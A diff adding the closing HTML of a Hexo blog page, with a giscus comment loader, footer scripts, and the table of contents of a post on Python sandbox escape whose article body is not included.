+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'skyI23/my-giscus-discussions',
+                'data-repo-id': 'R_kgDONL9k_w',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'bottom',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Python 沙箱逃逸</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="nav-text">逃逸目标</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtin-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtin 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec%EF%BC%88%E6%89%A7%E8%A1%8C-Python-%E4%BB%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-text">exec（执行 Python 代码字符串）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%EF%BC%88%E6%B1%82%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89"><span class="nav-text">eval（求值表达式）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97"><span class="nav-text">os 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-popen-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9C%80%E7%9B%B4%E8%A7%82%EF%BC%89"><span class="nav-text">system &#x2F; popen 系列（最直观）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spawn-posix-spawn-%E7%B3%BB%E5%88%97%EF%BC%88%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89"><span class="nav-text">spawn &#x2F; posix_spawn 系列（直接运行可执行文件）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="nav-text">exec* 系列（替换当前进程）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fork-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%EF%BC%89"><span class="nav-text">fork + 命令执行（子进程运行）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Popen-%E7%B3%BB%E5%88%97%EF%BC%88%E5%BA%95%E5%B1%82%E6%9E%84%E9%80%A0%EF%BC%8C%E7%81%B5%E6%B4%BB%E5%BA%A6%E6%9C%80%E9%AB%98%EF%BC%89"><span class="nav-text">Popen 系列（底层构造，灵活度最高）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%BB%E5%A1%9E%E6%89%A7%E8%A1%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%8A%B6%E6%80%81-%E8%BE%93%E5%87%BA"><span class="nav-text">阻塞执行并获取状态&#x2F;输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pty-%E6%A8%A1%E5%9D%97"><span class="nav-text">pty 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E5%91%BD%E4%BB%A4"><span class="nav-text">后门命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#breakpoint-%E5%87%BD%E6%95%B0"><span class="nav-text">breakpoint 函数</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B2%99%E7%AE%B1"><span class="nav-text">常见沙箱</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84"><span class="nav-text">Python 程序结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%EF%BC%88Module%EF%BC%89"><span class="nav-text">模块（Module）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%85%EF%BC%88Package%EF%BC%89"><span class="nav-text">包（Package）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%EF%BC%88Namespace%EF%BC%89"><span class="nav-text">命名空间（Namespace）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtins 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-builtins%EF%BC%9F"><span class="nav-text">什么是 builtins？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97%E5%86%85%E5%AE%B9"><span class="nav-text">builtins 模块内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%EF%BC%88Built-in-Functions%EF%BC%89"><span class="nav-text">内置函数（Built-in Functions）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B%EF%BC%88Built-in-Types%EF%BC%89"><span class="nav-text">内置类型（Built-in Types）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8%EF%BC%88Built-in-Exceptions%EF%BC%89"><span class="nav-text">内置异常（Built-in Exceptions）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%B8%B8%E9%87%8F%EF%BC%88Built-in-Constants%EF%BC%89"><span class="nav-text">内置常量（Built-in Constants）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">使用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">动态修改内置函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%AF%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">控制可用的内置函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%EF%BC%88Introspection%EF%BC%89"><span class="nav-text">内省机制（Introspection）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%B1%BB%E5%9E%8B-%E7%BB%93%E6%9E%84"><span class="nav-text">对象的类型&#x2F;结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E6%88%90%E5%91%98"><span class="nav-text">获取对象成员</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">命名空间与作用域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E6%A1%A3%E4%B8%8E%E5%B8%AE%E5%8A%A9"><span class="nav-text">文档与帮助</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inspect-%E6%A8%A1%E5%9D%97"><span class="nav-text">inspect 模块</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7"><span class="nav-text">魔术方法 &#x2F; 属性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">模块 &#x2F; 作用域相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins"><span class="nav-text">__builtins__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#import"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict"><span class="nav-text">__dict__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bases"><span class="nav-text">__bases__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subclasses"><span class="nav-text">__subclasses__()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0-%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">函数 &#x2F; 方法的执行环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#globals"><span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%97%A0-builtins-%E7%BB%95%E8%BF%87"><span class="nav-text">无 builtins 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF"><span class="nav-text">问题背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87"><span class="nav-text">通过内省机制绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%B1%BB"><span class="nav-text">获取 object 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-object-%E7%9A%84%E5%8F%AF%E7%94%A8%E5%AD%90%E7%B1%BB"><span class="nav-text">获取 object 的可用子类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E4%B8%AD%E7%9A%84%E5%8F%AF%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="nav-text">globals 中的可用模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">builtins 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">os 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97"><span class="nav-text">sys 模块</span></a></li></ol></li></ol></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        47 posts in total
+                    </span>
+                    
+                        <span>
+                            758.1k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+    
+        
+<script src="/js/build/libs/mermaid.min.js"></script>
+
+    
+    
+<script src="/js/build/plugins/mermaid.js"></script>
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+    
+<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>
+
+
+	
+</body>
+
+</html>
